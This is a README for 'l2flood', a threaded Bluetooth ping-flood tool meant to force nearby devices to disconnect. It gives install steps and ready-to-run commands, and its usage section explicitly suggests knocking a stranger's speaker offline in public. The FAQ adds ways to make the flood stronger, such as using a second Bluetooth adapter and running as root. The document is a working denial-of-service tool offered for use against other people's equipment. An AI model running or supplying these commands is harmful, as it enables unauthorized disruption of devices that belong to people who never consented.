# l2flood

[l2ping][1] with threads.

Flood a given bluetooth device with ping requests in order to force it to
disconnect.

# INSTALL

Satisfy the [dependencies](#dependencies) first, and then:

```bash
git clone https://github.com/kovmir/l2flood
cd l2flood
make # Use `make serial` to build upstream l2ping.
sudo make install
```

# USAGE

Suppose there is a loud bluetooth speaker in public, and suppose
`94:3a:2c:e1:2b:07` is its address. You can shut it off like that:

```bash
l2flood 94:3a:2c:e1:2b:07 # Flood a given device using all CPU threads.
l2flood -n 50 94:3a:2c:e1:2b:07 # Flood using 50 CPU threads.
```

A weak speaker CPU will not be able to process that many ping requests, and
music decoding simultaneously; so it will disconnect.

Keep in mind:

* The default delay between packets has been changed to `0`.
* The default data packet size has been increased to `600`.
* [`l2ping` options][1] work.
* *Your bluetooth card is your bottleneck: Even if you have a multi-core
  multi-gigahertz CPU, it makes little to no sense to spawn as much as 1,000
  threads, because your bluetooth card is unlikely to be fast enough to process
  all the requests as quick as you submit them.*

# DEPENDENCIES

* [Bluez][3]

# SUPPORTED OS

* Linux

# FAQ

**Q: Does it work in [termux][2]?**

A: No, [Bluez][3] libraries are not available in termux.

**Q: Does it work on Steam Deck?**

A: Yes.

**Q: How to increase flood efficiency?**

A: Get a second bluetooth card, and flood using both of them.

**Q: How to fix `Can't create socket: Operation not permitted`?**

A: Re-run as `root` user.

```bash
BT_ADDR='00:00:00:00:00:00' # Set the target address.
l2flood -i hci0 $BT_ADDR
l2flood -i hci1 $BT_ADDR
```

[1]: https://linux.die.net/man/1/l2ping
[2]: https://github.com/termux/termux-app
[3]: https://wiki.archlinux.org/title/Bluetooth
